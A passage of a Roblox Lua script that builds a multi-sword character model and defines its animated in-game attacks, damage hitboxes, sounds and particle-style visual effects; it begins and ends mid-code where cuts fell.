Partweld=weld(m,HandleF,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0538845062, -0.0311193466, 0.0011100769, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleF,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.417726517, 1.28746033e-05, 0.00106811523, 0.999999881, 2.98023224e-08, 4.3159529e-05, -1.86628313e-09, 0.999999821, -4.31849694e-05, -4.31595145e-05, 4.31807348e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleF,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.582269669, -1.95503235e-05, 0.00113105774, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(0.449999988, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleF,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(4.80104828, -0.0301551819, 0.910226822, 0.984810233, -0.173634201, -3.186717e-05, -5.34346073e-05, -0.000119507618, -0.999999881, 0.173634231, 0.984810054, -0.000127013685))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(0.449999958, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleF,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-4.80100822, -0.0339546204, 0.910426855, -0.984802961, 0.173674881, 4.78334514e-05, 3.63842737e-05, -6.91416062e-05, 0.99999994, 0.173674941, 0.984802961, 6.17822516e-05))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(3.95000005, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleF,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.68768311, -0.0297698975, 0.0999078751, 0.999999881, 6.32107185e-05, 7.89154292e-05, 7.89154292e-05, 3.9858099e-09, -0.999999881, -6.32107185e-05, 0.999999762, 1.32292555e-09))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
HitboxF=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,1,"Really black","HitboxF",Vector3.new(4.65999985, 1.13, 0.200000048))
HitboxFweld=weld(m,HandleF,HitboxF,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.92450333, 0.0550558567, 0.000980377197, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",HitboxF,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.75999999))

 local MetalAOEStorm = function()
			so("http://roblox.com/asset/?id=183763506",Cha.Torso,4,0.5)
			so("http://roblox.com/asset/?id=338601253",Cha.Torso,4,0.5)
			so("http://roblox.com/asset/?id=199145761", Cha.Torso, 1, math.random(75, 125) / 100)
			

			
                local Wave = Instance.new("Part", game.Workspace)
                Wave.Name = "Shockwave"
                Wave.BrickColor = BrickColor.new("Really black")
                Wave.Size = Vector3.new(1, 1, 1)
                Wave.Shape = "Ball"
                Wave.CanCollide = false
                Wave.Anchored = true
                Wave.TopSurface = 0
                Wave.BottomSurface = 0
                Wave.Touched:connect(function(hit)
                    --print(hit.Name)
                    if hit.Parent:findFirstChild("Humanoid") and hit.Parent:findFirstChild("Torso") then
                        if hit.Parent.Name ~= Cha.Name then
                           --print("Damaged " .. hit.Parent.Name)
							con69=Wave.Touched:connect(function(hit) Damagefunc(hit,25,45,math.random(2,6),"Normal",RootPart,.2,1) end) 
                        end
                    end
                end)
                
                Instance.new("SpecialMesh", Wave).MeshType = "Sphere"
                
                delay(0, function()


                        for i = 1, 68, 1 do
                            Wave.Size = Vector3.new(1 + i*2, 1 + i*0.5, 1 + i*2)
                            Wave.CFrame = Cha.Torso.CFrame
                            local t = i / 68
                            Wave.Transparency = t
                            wait()
                        end

                    Wave:Destroy()
					con69:disconnect()
                end)
                delay(0, function()
                    while wait() do
                        if Wave ~= nil then
                            Wave.CFrame = Cha.Torso.CFrame
                        else
                            break
                        end
                    end
                end)
            end

function attackone()
        attack=true
        con1=HitboxA.Touched:connect(function(hit) Damagefunc(hit,10,15,math.random(10,20),"Normal",RootPart,.2,1) end) 
        for i=0,1,0.1 do
                swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(130),math.rad(0),math.rad(20)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(-90)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-80)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(80)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(30),math.rad(0),math.rad(0)),.3)
HandleCweld.C0=clerp(HandleCweld.C0,cf(-5,0,0)*angles(math.rad(40),math.rad(50),math.rad(10)),.3)
HandleDweld.C0=clerp(HandleDweld.C0,cf(5,0,0)*angles(math.rad(40),math.rad(-50),math.rad(10)),.3)
HandleFweld.C0=clerp(HandleFweld.C0,cf(-5,3,0)*angles(math.rad(40),math.rad(50),math.rad(10)),.3)
HandleEweld.C0=clerp(HandleBweld.C0,cf(5,3,0)*angles(math.rad(40),math.rad(-50),math.rad(10)),.3)

        end
        so("http://www.roblox.com/asset/?id=233856140",HitboxA,1,1) 
        so("http://www.roblox.com/asset/?id=234365549",HitboxA,1,1) 
        for i=0,1,0.1 do
                swait()
                local blcf = HitboxA.CFrame*CFrame.new(0,.5,0)
if trails == true then
	if scfr and (HitboxA.Position-scfr.p).magnitude > .1 then
	local h = 5
	local a,b = Triangle((scfr*CFrame.new(0,h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p,(blcf*CFrame.new(0,h/2,0)).p)
	if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
	local a,b = Triangle((blcf*CFrame.new(0,h/2,0)).p,(blcf*CFrame.new(0,-h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p)
	if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
	scfr = blcf
	elseif not scfr then
	scfr = blcf
	end
end
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(30),math.rad(0),math.rad(20)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(-50)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(80)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(10),math.rad(-80)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(-40),math.rad(-30),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(30),math.rad(0),math.rad(0)),.3)
        end
        attack=false
        con1:disconnect()
end

function attacktwo()
        attack=true
        con1=HitboxB.Touched:connect(function(hit) Damagefunc(hit,10,15,math.random(10,20),"Normal",RootPart,.2,1) end) 
        for i=0,1,0.1 do
                swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(90)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(130),math.rad(0),math.rad(-20)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(80)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(-80)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(30),math.rad(0),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
HandleCweld.C0=clerp(HandleCweld.C0,cf(-5,0,0)*angles(math.rad(40),math.rad(50),math.rad(0)),.3)
HandleDweld.C0=clerp(HandleDweld.C0,cf(5,0,0)*angles(math.rad(40),math.rad(-50),math.rad(0)),.3)
HandleFweld.C0=clerp(HandleFweld.C0,cf(-5,3,0)*angles(math.rad(40),math.rad(50),math.rad(10)),.3)
HandleEweld.C0=clerp(HandleBweld.C0,cf(5,3,0)*angles(math.rad(40),math.rad(-50),math.rad(10)),.3)
        end
        so("http://www.roblox.com/asset/?id=233856146",HitboxB,1,1) 
        so("http://www.roblox.com/asset/?id=234365573",HitboxB,1,1) 
        for i=0,1,0.1 do
                swait()
                        local blcf = HitboxB.CFrame*CFrame.new(0,.5,0)
if trails == true then
	if scfr and (HitboxB.Position-scfr.p).magnitude > .1 then
	local h = 5
	local a,b = Triangle((scfr*CFrame.new(0,h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p,(blcf*CFrame.new(0,h/2,0)).p)
	if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
	local a,b = Triangle((blcf*CFrame.new(0,h/2,0)).p,(blcf*CFrame.new(0,-h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p)
	if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
	scfr = blcf
	elseif not scfr then
	scfr = blcf
	end
end
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(20)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(30),math.rad(0),math.rad(-50)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(-80)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(-10),math.rad(80)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(30),math.rad(-30),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(-40),math.rad(0),math.rad(0)),.3)
        end
        attack=false
        con1:disconnect()
end

function attackthree()
        attack=true
        con1=HitboxA.Touched:connect(function(hit) Damagefunc(hit,10,15,math.random(10,20),"Normal",RootPart,.2,1) end) 
        con2=HitboxB.Touched:connect(function(hit) Damagefunc(hit,10,15,math.random(10,20),"Normal",RootPart,.2,1) end) 
        con3=HitboxC.Touched:connect(function(hit) Damagefunc(hit,10,150,math.random(10,20),"Normal",RootPart,.2,1) end) 
        con4=HitboxD.Touched:connect(function(hit) Damagefunc(hit,10,150,math.random(10,20),"Normal",RootPart,.2,1) end) 
        for i=0,1,0.1 do
                swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(130),math.rad(0),math.rad(-20)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(130),math.rad(0),math.rad(-20)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(80)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(-80)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(30),math.rad(0),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
HandleCweld.C0=clerp(HandleCweld.C0,cf(-5,0,0)*angles(math.rad(40),math.rad(50),math.rad(0)),.3)
HandleDweld.C0=clerp(HandleDweld.C0,cf(5,0,0)*angles(math.rad(40),math.rad(-50),math.rad(0)),.3)
HandleFweld.C0=clerp(HandleFweld.C0,cf(-5,5,0)*angles(math.rad(40),math.rad(50),math.rad(10)),.3)
HandleEweld.C0=clerp(HandleEweld.C0,cf(5,5,0)*angles(math.rad(40),math.rad(-50),math.rad(10)),.3)
        end
        so("http://www.roblox.com/asset/?id=233856146",HitboxB,1,1) 
        so("http://www.roblox.com/asset/?id=234365573",HitboxB,1,1) 
        for i=0,1,0.1 do
                swait()
                        local blcf = HitboxB.CFrame*CFrame.new(0,.5,0)
if trails == true then
	if scfr and (HitboxB.Position-scfr.p).magnitude > .1 then
	local h = 5
	local a,b = Triangle((scfr*CFrame.new(0,h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p,(blcf*CFrame.new(0,h/2,0)).p)
	if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
	local a,b = Triangle((blcf*CFrame.new(0,h/2,0)).p,(blcf*CFrame.new(0,-h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p)
	if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
	scfr = blcf
	elseif not scfr then
	scfr = blcf
	end
end
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(20)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(30),math.rad(0),math.rad(-50)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(-80)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(-10),math.rad(80)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(-30),math.rad(0),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(-40),math.rad(0),math.rad(0)),.3)
HandleDweld.C0=clerp(HandleDweld.C0,cf(0,0,0)*angles(math.rad(-30),math.rad(0),math.rad(0)),.3)
HandleCweld.C0=clerp(HandleCweld.C0,cf(0,0,0)*angles(math.rad(-40),math.rad(0),math.rad(0)),.3)
HandleFweld.C0=clerp(HandleFweld.C0,cf(0,0,0)*angles(math.rad(-30),math.rad(0),math.rad(10)),.3)
HandleEweld.C0=clerp(HandleEweld.C0,cf(0,0,0)*angles(math.rad(40),math.rad(0),math.rad(10)),.3)
        end
        attack=false
        con1:disconnect()
        con2:disconnect()
        con3:disconnect()
        con4:disconnect()
end

function DemonSwords()
        attack=true
        con1=HitboxC.Touched:connect(function(hit) Damagefunc(hit,100,999999,math.random(10,20),"Normal",RootPart,.2,1) end) 
        con2=HitboxD.Touched:connect(function(hit) Damagefunc(hit,100,999999,math.random(10,20),"Normal",RootPart,.2,1) end) 
        con3=HitboxE.Touched:connect(function(hit) Damagefunc(hit,100,999999,math.random(10,20),"Normal",RootPart,.2,1) end) 
        con4=HitboxF.Touched:connect(function(hit) Damagefunc(hit,100,999999,math.random(10,20),"Normal",RootPart,.2,1) end) 
        for i=0,1,0.1 do
                swait()
HandleCweld.C0=clerp(HandleCweld.C0,cf(-5,0,0)*angles(math.rad(40),math.rad(50),math.rad(0)),.3)
HandleDweld.C0=clerp(HandleDweld.C0,cf(5,0,0)*angles(math.rad(40),math.rad(-50),math.rad(0)),.3)
HandleFweld.C0=clerp(HandleFweld.C0,cf(-5,3,0)*angles(math.rad(-40),math.rad(50),math.rad(0)),.3)
HandleEweld.C0=clerp(HandleEweld.C0,cf(5,3,0)*angles(math.rad(-40),math.rad(-50),math.rad(0)),.3)
        end
        so("http://www.roblox.com/asset/?id=233856146",HitboxB,1,1) 
        so("http://www.roblox.com/asset/?id=234365573",HitboxB,1,1) 
        for i=0,1,0.1 do
                swait()
                        local blcf = HitboxC.CFrame*CFrame.new(0,.5,0)
if trails == true then
	if scfr and (HitboxC.Position-scfr.p).magnitude > .1 then
	local h = 5
	local a,b = Triangle((scfr*CFrame.new(0,h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p,(blcf*CFrame.new(0,h/2,0)).p)
	if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
	local a,b = Triangle((blcf*CFrame.new(0,h/2,0)).p,(blcf*CFrame.new(0,-h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p)
	if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
	scfr = blcf
	elseif not scfr then
	scfr = blcf
	end
	local blcf2 = HitboxD.CFrame*CFrame.new(0,.5,0)
	if scfr2 and (HitboxD.Position-scfr2.p).magnitude > .1 then
	local h = 5
	local a,b = Triangle((scfr2*CFrame.new(0,h/2,0)).p,(scfr2*CFrame.new(0,-h/2,0)).p,(blcf2*CFrame.new(0,h/2,0)).p)
	if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
	local a,b = Triangle((blcf2*CFrame.new(0,h/2,0)).p,(blcf2*CFrame.new(0,-h/2,0)).p,(scfr2*CFrame.new(0,-h/2,0)).p)
	if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
	scfr2 = blcf2
	elseif not scfr2 then
	scfr2 = blcf2
	end
end
HandleDweld.C0=clerp(HandleDweld.C0,cf(0,0,-4)*angles(math.rad(40),math.rad(0),math.rad(0)),.3)
HandleCweld.C0=clerp(HandleCweld.C0,cf(0,0,-4)*angles(math.rad(40),math.rad(0),math.rad(0)),.3)
HandleFweld.C0=clerp(HandleFweld.C0,cf(0,3,-4)*angles(math.rad(-40),math.rad(0),math.rad(0)),.3)
HandleEweld.C0=clerp(HandleEweld.C0,cf(0,3,-4)*angles(math.rad(-40),math.rad(0),math.rad(0)),.3)
ringExplode(HandleD.CFrame*CFrame.Angles(math.pi/2,0,0),colours[6],5)
ringExplode(HandleC.CFrame*CFrame.Angles(math.pi/2,0,0),colours[6],5)
ringExplode(HandleF.CFrame*CFrame.Angles(math.pi/2,0,0),colours[6],5)
ringExplode(HandleE.CFrame*CFrame.Angles(math.pi/2,0,0),colours[6],5)
        end
        attack=false
        con1:disconnect()
        con2:disconnect()
        con3:disconnect()
        con4:disconnect()
end

function summonMura()
        Attacking = true
        Humanoid.WalkSpeed = 0
        local cf = Torso.CFrame
        local model = Instance.new("Model",Character)
        for i=1,6 do
                local angle = math.pi*2/6*i
                local p = Part2("",model,Vector3.new(10,1,10),cf*CFrame.new(0,-3,0)*CFrame.Angles(0,angle,0),colours[6],0,true,false,"SmoothPlastic")
        end
        local circle = Part2("",model,Vector3.new(14.5,.5,14.5),cf*CFrame.new(0,-3,0),colours[2],0,true,false,"SmoothPlastic")
        Instance.new("CylinderMesh",circle)
        for i=1,40 do
                wait(1/30)
                local speed = i/40
                local r = math.random(1,2)
                if i%2==0 then sphereExtend(cf*CFrame.new(rand(5),-2,rand(5)),r==1 and colours[6] or colours[2],5)end
        end
        local t = Part2("",model,Vector3.new(10,10,5),cf*CFrame.new(0,10,0),colours[6],1,true,false,"SmoothPlastic")
        local a1 = Part2("",model,Vector3.new(5,10,5),cf*CFrame.new(-7.5,10,0),colours[6],1,true,false,"SmoothPlastic")
        local a2 = Part2("",model,Vector3.new(5,10,5),cf*CFrame.new(7.5,10,0),colours[6],1,true,false,"SmoothPlastic")
        local h = Part2("",model,Vector3.new(5,5,5),cf*CFrame.new(0,17.5,0),colours[6],1,true,false,"SmoothPlastic")
        local ot,oa1,oa2,oh = t.CFrame,a1.CFrame,a2.CFrame,h.CFrame
        appear(a1,1,.025)appear(a2,1,.025)appear(t,1,.025)appear(h,1,.025)
        for i=1,40 do
                wait(1/30)
                local speed = i/40
                local r = math.random(1,2)
                if i%2==0 then sphereExtend(cf*CFrame.new(rand(5),-2,rand(5)),r==1 and colours[6] or colours[2],5);spikeMagic(cf*CFrame.new(rand(5),-2,rand(5)),math.random(2,5),r==1 and colours[6] or colours[2])end
                a1.CFrame = cslerp(a1.CFrame,oa1*CFrame.new(0,5,-2.5)*CFrame.Angles(math.pi/1.5,0,0),speed)
                a2.CFrame = cslerp(a2.CFrame,oa2*CFrame.new(0,5,-2.5)*CFrame.Angles(math.pi/1.5,0,0),speed)
                h.CFrame = cslerp(h.CFrame,oh*CFrame.Angles(math.pi/6,0,0),speed)
        end
        fade(a1,0,.075)fade(a2,0,.075)fade(t,0,.075)fade(h,0,.075)
        ringExplode(t.CFrame*CFrame.Angles(math.pi/2,0,0),colours[6],5)
        crater(cf*CFrame.new(0,-3,0),20)
        cylinderExplode(cf,colours[6],10,1000)
        checkDmgArea(cf,50,20)
        wait(2)
        for i=1,10 do
                wait(1/30)
                local speed = i/10
        end
        model:Destroy()
        Humanoid.WalkSpeed = 16
        Attacking = false
end

function MetalStorm()
	mana=mana-100
attack=true
Humanoid.JumpPower=0
coroutine.resume(coroutine.create(function()
      
            MetalAOEStorm()
end))

con1=HitboxA.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
con2=HitboxB.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
con3=HitboxC.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
con4=HitboxD.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
for i=0,1,0.1 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(90)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(-90)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
end
for i=0,3,1 do
so("http://roblox.com/asset/?id=231917987",Torso,1,1)
swait()
for i=0,54,1.5 do
swait()
local blcf = HitboxA.CFrame*CFrame.new(0,.5,0)
if trails == true then
if scfr and (HitboxA.Position-scfr.p).magnitude > .1  then
local h = 5
local a,b = Triangle((scfr*CFrame.new(0,h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p,(blcf*CFrame.new(0,h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
local a,b = Triangle((blcf*CFrame.new(0,h/2,0)).p,(blcf*CFrame.new(0,-h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
scfr = blcf
elseif not scfr then
scfr = blcf
end
end
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(90)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(-90)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,-0.01*i,-1*i)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,-0.01*i,-1*i)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
HandleCweld.C0=clerp(HandleBweld.C0,cf(1.5*i,0,-2*i)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
HandleDweld.C0=clerp(HandleBweld.C0,cf(1*i,0,2*i)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
HandleEweld.C0=clerp(HandleBweld.C0,cf(0.6*i,0,0.4*i)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
HandleFweld.C0=clerp(HandleBweld.C0,cf(0.3*i,0,-0.4*i)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,1)*euler(0,0,12*i),.3)
end
end
con1:disconnect()
con2:disconnect()
con3:disconnect()
con4:disconnect()
attack=false
Humanoid.JumpPower=50
end

function Smoke(origin,color)
        local p = Part2("Effect",workspace,Vector3.new(2,2,2),origin*CFrame.new(rand(5),-1,rand(5)),color or "Black",.1,false,false,"SmoothPlastic")
        local m = Mesh(p,"Sphere",Vector3.new(1.25,1.25,1.25))
        local bp = Instance.new("BodyPosition",p)bp.D = 100 bp.P = 100 bp.position = p.Position+Vector3.new(0,7,0)
        q(function(pa,me)
                fade(pa,.1)
                for i=25,100 do
                        me.Scale = me.Scale+Vector3.new(0.15,0.1,0.15)
                        wait(1/30)
                end
                pa:Destroy()
        end,{p,m})
end
function brickMagic(origin,color,size)
        local p = Part2("Effect",workspace,Vector3.new(size,size,size),origin*CFrame.Angles(rand(5),rand(5),rand(5)),color,.2,true,false,"SmoothPlastic")
        local m = Mesh(p,"Brick")
        q(function(pa,me)
                fade(pa,.2)
                for i=20,100 do
                        me.Scale = me.Scale-Vector3.new(0.05,0.05,0.05)
                        wait(1/30)
                end
                pa:Destroy()
        end,{p,m})
end
function spikeMagic(origin,size,color)
        local p = Part2("Effect",workspace,Vector3.new(1,1,1),origin*CFrame.new(0,-size,0),color,1,true,false,"SmoothPlastic")
        local m = Mesh(p,"FileMesh",Vector3.new(size/2,size*2,size/2),asset..meshes["spike"])
        q(function(pa,me)
        appear(pa,1)
        for i=1,size,.5 do
                wait(1/30)
                pa.CFrame = pa.CFrame*CFrame.new(0,.5,0)
        end
        wait(math.random(2,3))fade(pa,0)
        Delay(3,function()pa:Destroy()end)
        end,{p,m})
end
function placePart(origin,size,color,material)
        local p = Part2("Effect",workspace,Vector3.new(size,size,size),origin*CFrame.Angles(rand(5),rand(5),rand(5)),color,0,true,true,material)
        local m = Mesh(p,"Brick")
        q(function(pa,me)
                wait(5)
                fade(pa,0)
                Delay(1.25,function()pa:Destroy()end)
        end,{p,m})
end
function placePartRandSize(origin,min,max,color,material)
        local p = Part2("Effect",workspace,Vector3.new(math.random(min,max),math.random(min,max),math.random(min,max)),origin*CFrame.Angles(rand(5),rand(5),rand(5)),color,0,true,true,material)
        local m = Mesh(p,"Brick")
        q(function(pa,me)
                wait(5)
                fade(pa,0)
                Delay(1.25,function()pa:Destroy()end)
        end,{p,m})
end
function crater(origin,dist)
        local b = workspace.Base
        local bc = b and tostring(b.BrickColor) or "Bright green"
        local m = b and b.Material or "Grass"
        for i=0,360,30 do
                local cf = origin*CFrame.Angles(0,math.rad(i),0)*CFrame.new(0,0,dist)*CFrame.Angles(math.rad(i/30),0,rand(5))
                placePartRandSize(cf,5,15,bc,m)
        end
end
function cylinderExplode(origin,color,size,ysize)
        local p = Part2("Effect",workspace,Vector3.new(size,ysize or size,size),origin,color,.2,true,false,"SmoothPlastic")
        local m = Instance.new("CylinderMesh",p)
        q(function(pa,me)
                for i=.2,1,.0075 do
                        me.Scale = me.Scale+Vector3.new(.1,0,.1)
                        pa.Transparency = i
                        wait(1/30)
                end
                pa:Destroy()
        end,{p,m})
end
function ringExplode(origin,color,size)
        local p = Part2("Effect",workspace,Vector3.new(1,1,1),origin,color,.2,true,false,"SmoothPlastic")
        local m = Mesh(p,"FileMesh",Vector3.new(size,size,1),asset..meshes["ring"])
        q(function(pa,me)
                for i=.2,1,.05 do
                        me.Scale = me.Scale+Vector3.new(0.25,0.25,0)
                        pa.Transparency = i
                        wait(1/30)
                end
                pa:Destroy()
        end,{p,m})
end
function crownExplode(origin,color,size)
        local p = Part2("Effect",workspace,Vector3.new(size,size,size),origin,color,.2,true,false,"SmoothPlastic")
        local m = Mesh(p,"FileMesh",Vector3.new(size/2,size/2,size/2),asset..meshes["crown"])
        q(function(pa,me)
                for i=.2,1,.025 do
                        me.Scale = me.Scale+Vector3.new(0.75,0.75,0.75)
                        pa.Transparency = i
                        wait(1/30)
                end
                pa:Destroy()
        end,{p,m})
end
function glitter(origin,color)
        local p = Part2("Effect",workspace,Vector3.new(0.75,0.75,0.75),origin*CFrame.new(rand(5),rand(5),rand(5))*CFrame.Angles(rand(5),rand(5),rand(5)),color,0,true,false,"SmoothPlastic")
        local m = Mesh(p,"Brick",Vector3.new(1,1,1))
        q(function(pa,me)
                fade(pa,0)
                for i=0,1,.05 do
                        me.Scale = me.Scale-Vector3.new(0.05,0.05,0.05)
                        wait(1/30)
                end
                pa:Destroy()
        end,{p,m})
end
function sphereExtend(origin,color,size)
